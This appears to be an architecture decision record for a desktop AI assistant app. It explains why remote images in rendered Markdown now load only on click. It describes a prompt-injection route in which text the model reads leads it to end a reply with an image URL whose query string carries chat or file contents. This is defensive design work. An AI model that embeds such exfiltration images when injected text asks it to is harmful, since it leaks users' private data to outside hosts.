# A remote image in Markdown loads only when the owner clicks it

Replies, side questions, previewed Markdown files and the artifact editor's preview all render through `Markdown.tsx`. It used react-markdown's own `img`, which keeps `http:` and `https:` sources, and nothing else in the app limits images: Tauri's CSP is off and `index.html` sets only `frame-src` and `object-src` (ADR 0007). So `![](https://host/p.png?d=…)` made the webview request that address as soon as the text rendered, while a reply was still streaming in (#341).

Hermes's replies carry text the model read from web pages, files and tool output. A prompt injection in any of them can ask the model to end its answer with such an image, with chat content, file contents or a tool's output in the query string. The request also gives away this computer's address and when the owner read the reply, and the same tag can make GET requests to services on the LAN or on loopback.

## Decisions

- **A source on the network shows as a placeholder.** The placeholder is a button that names the host and the image's alt text, as in "status: image from example.test, click to load", with the whole address as its tooltip. No `<img>` with that source exists until the owner clicks it. The click then renders the image as before.
- **The click loads only the image.** A placeholder inside a link loads the image and does not also open the link. A later click on the loaded image follows the link as before.
- **Every Markdown surface gets it.** The rule lives in `Markdown.tsx`'s `components`, which every one of these surfaces uses.
- **Sources react-markdown already drops stay dropped.** Its URL filter empties `data:`, `blob:` and every scheme it doesn't allow, so those images rendered with no source before this change and still do.

## Considered options

- **`img-src 'self' data: blob:` in the `index.html` policy.** That policy would block the image after the click too, unless the click fetched it through Rust and showed it as a `blob:`. It would also cover every other `<img>` in the app, such as bot pictures, and each would need checking. Not done: the component is the one place Markdown images render, and the test pins its behavior.
- **A Settings switch to load remote images in replies at once.** Not built. Each image is one click, and no owner has asked for it.
- **Loading images from the connected dashboard's own origin at once.** No reply or file relies on such images today, and a dashboard address is as able to carry a query string as any other. Not done.

## Consequences

- A reply that shows a chart or a screenshot from the web needs one click per image.
- A click on a placeholder sends the request it names, query string included. The tooltip shows the full address before the click.
- Images in raw HTML were never rendered, because Markdown here has no raw HTML. That is unchanged.
